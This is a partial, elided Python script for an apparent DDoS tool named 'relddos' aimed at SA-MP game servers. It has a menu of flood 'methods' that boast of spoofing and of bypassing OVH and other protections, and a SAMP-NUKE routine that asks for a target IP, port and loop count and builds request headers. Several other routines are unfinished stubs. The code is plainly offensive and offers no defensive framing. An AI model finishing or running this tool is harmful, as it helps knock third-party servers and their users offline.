...
import os, socket, threading, colorsys
import socket
import sys
import sys
import ssl
...
def rs():
  print('Under Developen/Not Redy Yet')
def so():
  print('Under Developen/Not Redy Yet')
def sd():
  print('Under Developen/Not Redy Yet')
def sn():
  ...
  ip = str(input("IP : "))
  port = int(input("PORT : "))
  lo = int(input("LOOPS x3 : "))
  referer = "Referer: " + random.choice(mozila) + ip + "\r\n" 
...
def relddos():
   ...
   if command == "methods" or command == "METHODS":
     print("""
     METHOD ON RN 
     [ON] SAMP-NUKE     | BYPASSING TARGET AND HAVE HIGH PROXY
     [OFF] SAMP-OVH     | BYPASSING TARGET OVH (UPGRADE FROM OVH-UDP)
     [OFF] REL-SAMP     | SPOOFING AND BYPASSING TARGET AND HAVE VERY HIGH PROXY
     [OFF] SAMP-DOPMINER | BYPASSING DOPMINER
     """)
     relddos()
   if command == "SAMP-NUKE":
      sn()
   else:
     relddos()
relddos()
